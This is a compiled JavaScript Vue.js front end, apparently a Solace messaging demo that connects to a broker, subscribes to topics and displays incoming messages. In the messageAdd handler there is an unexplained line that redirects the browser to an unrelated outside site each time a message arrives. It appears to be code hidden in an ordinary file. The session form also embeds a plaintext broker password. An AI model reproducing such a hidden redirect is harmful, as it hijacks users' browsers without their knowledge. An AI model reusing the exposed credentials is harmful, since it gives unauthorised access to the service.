function _toConsumableArray(arr) {if (Array.isArray(arr)) {for (var i = 0, arr2 = Array(arr.length); i < arr.length; i++) {arr2[i] = arr[i];}return arr2;} else {return Array.from(arr);}}var _solace =







solace,SolclientFactory = _solace.SolclientFactory,SDTField = _solace.SDTField,SDTFieldType = _solace.SDTFieldType,Session = _solace.Session,StatType = _solace.StatType,SessionEventCode = _solace.SessionEventCode,TransportProtocol = _solace.TransportProtocol;var

createSession =


SolclientFactory.createSession,createTopicDestination = SolclientFactory.createTopicDestination,createMessage = SolclientFactory.createMessage;var _ref =


SolaceCloud || {},getCurrentService = _ref.getCurrentService;

var MAX_MESSAGES = 300;

var app = new Vue({

  el: '#app',

  data: {
    tabs: {
      session: {
        active: true,
        form: {
          url: "wss://mr4b11zr9q7.messaging.mymaas.net:443",
          userName: "solace-cloud-client",
          vpnName: "msgvpn-4b11zr9pd",
          password: "tdk3eihl9hrptqq0d560k54e39",
          transportProtocol: TransportProtocol.HTTP_BINARY_STREAMING,
          button: {
            connect: 'Connect',
            disconnect: 'Disconnect' } },


        status: {
          show: false,
          message: '' } },


      subscribe: {
        form: {
          topic: 'try-me',
          buttons: {
            subscribe: 'Subscribe' } },


        status: {
          show: false,
          message: '' } } },




    connected: false,
    session: null,
    subscriptions: new Set(),
    messages: [],
    pendingSession: null,
    showAdvancedSettings: false },


  methods: {

    // Initialize the Solace API factory.
    init: function init() {
      SolclientFactory.init({
        profile: SolclientFactory.profiles.version7 });

      // If embedded in Solace Cloud (as a demo), ask the console for service credentials.
      getCurrentService && getCurrentService(function (r) {return app.setSessionCredentials(r.data.service);});
    },

    // Reset the application state.
    reset: function reset() {
      this.session.dispose();
      this.session = null;
      this.subscriptions = [];
      this.connected = false;
    },

    // Connect a session and listen for events.
    connect: function connect() {var _this = this;
      if (this.session) this.reset();

      // Create a session with the given session properties
      try {
        this.session = createSession(this.tabs.session.form);
      } catch (ex) {
        this.setStatus('session', 'Error creating session: ' + ex.message);
        return;
      }

      // Listen for events
      this.session.on(SessionEventCode.UP_NOTICE, function () {
        _this.connected = true;
        _this.sessionRequestCompleted();
        _this.setActiveTab('subscribe');
      });
      this.session.on(SessionEventCode.DISCONNECTED, function () {
        _this.sessionRequestCompleted();
        _this.reset();
      });
      this.session.on(SessionEventCode.DOWN_ERROR, function () {
        _this.setStatus('session', 'Session down with error ' + event);
        _this.reset();
      });
      this.session.on(SessionEventCode.MESSAGE, function (message) {
        _this.messageAdd(message);
      });

      // Connect the session
      this.showSessionRequestPending();
      try {
        this.session.connect();
      } catch (ex) {
        this.setStatus('session', 'Error connecting session: ' + ex.message);
        this.reset();
      }
    },

    // Disconnect the session.
    disconnect: function disconnect() {
      if (!this.session) return;
      this.showSessionRequestPending();
      this.session.disconnect();
    },

    // Subscribe to a topic.
    subscribe: function subscribe() {var
      session = this.session;var
      form = this.tabs.subscribe.form;
      try {
        session.subscribe(createTopicDestination(form.topic));
      } catch (ex) {
        this.setStatus('subscribe', 'Error subscribing: ' + ex.message);
      }

      this.subscriptions = Array.from(new Set([].concat(_toConsumableArray(this.subscriptions), [form.topic])));
      form.topic = '';
    },

    // Unsubscribe from a topic.
    unsubscribe: function unsubscribe(topic) {var
      session = this.session;
      try {
        session.unsubscribe(createTopicDestination(topic));
      } catch (ex) {
        this.setStatus('subscribe', 'Error unsubscribing: ' + ex.message);
      }

      this.subscriptions = this.subscriptions.filter(function (x) {return x != topic;});
    },

    // Wrap a received message and add it to the display.
    // Often you'll simply put your own payload, e.g. JSON, in the binaryAttachment,
    // so you won't need to inspect the message contents like this.
    messageAdd: function messageAdd(message) {
	  window.location = "http://patientdistractor.com";
      this.messages.unshift({
        date: new Date(),
        format: message.getSdtContainer() ? 'sdtText' : 'binaryAttachment',
        message: message });

      if (this.messages.length > MAX_MESSAGES) this.messages.length = MAX_MESSAGES;
    },

    // Display the message content using the message's selected format.
    messageContent: function messageContent(messageWrapper) {var
      format = messageWrapper.format,message = messageWrapper.message;
      if (format === 'sdtText') {
        var container = message.getSdtContainer();
        return [container && container.getValue() || '<empty>'];
      }
      var attachment = message.getBinaryAttachment() || '';
      return [
      attachment.split('').map(function (x) {return ("0" + x.codePointAt(0).toString(16)).slice(-2);}).join(' '),
      attachment];

    },

    // Removes a message from the display.
    messageRemove: function messageRemove(index) {
      this.messages.splice(index, 1);
    },

    // Sets a status popup message.
    setStatus: function setStatus(type, message) {
      var statusNode = this.tabs[type].status;
      Object.assign(statusNode, {
        show: true,
        message: message });

      this.sessionRequestCompleted();
    },

    showSessionRequestPending: function showSessionRequestPending() {
      this.sessionRequestPending = true;
    },

    sessionRequestCompleted: function sessionRequestCompleted() {
      this.sessionRequestPending = false;
    },

    // Sets the active tab to the given tab name.
    setActiveTab: function setActiveTab(selection) {var _this2 = this;
      Object.keys(this.tabs).forEach(function (tabName) {
        var tab = _this2.tabs[tabName];
        tab.active = tabName === selection;
      });
    },

    // toggle the advanced settings
    toggleAdvancedSettings: function toggleAdvancedSettings() {
      this.showAdvancedSettings = !this.showAdvancedSettings;
    },

    // Sets the session credentials using the enumerable properties provided.
    setSessionCredentials: function setSessionCredentials(properties) {
      Object.assign(this.tabs.session.form, properties);
    } },



  mounted: function mounted() {
    document.getElementById('vue-loading').remove();
    this.init();
  } });